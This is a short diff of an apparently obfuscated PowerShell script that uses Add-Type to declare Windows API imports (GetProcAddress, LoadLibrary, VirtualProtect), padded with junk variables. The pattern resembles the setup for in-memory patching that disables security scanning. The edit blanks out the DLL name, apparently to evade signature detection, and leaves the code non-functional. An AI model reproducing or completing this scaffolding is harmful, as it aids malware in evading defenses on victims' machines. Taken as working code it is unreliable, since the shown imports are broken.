@@ -1,4 +1,4 @@
-$test = Add-Typ
+$test = Add-Type
 $556 = 777
 $hhh = "nononeonasdasd"
 $556 = 777
@@ -11,11 +11,11 @@ $afrcv = @"
 using System;
 using System.Runtime.InteropServices;
 public class afrcv {
-    [DllImport("kernel32")]
+    [DllImport("")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
+    [DllImport("")]
     public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
+    [DllImport("")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr odwsuy, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
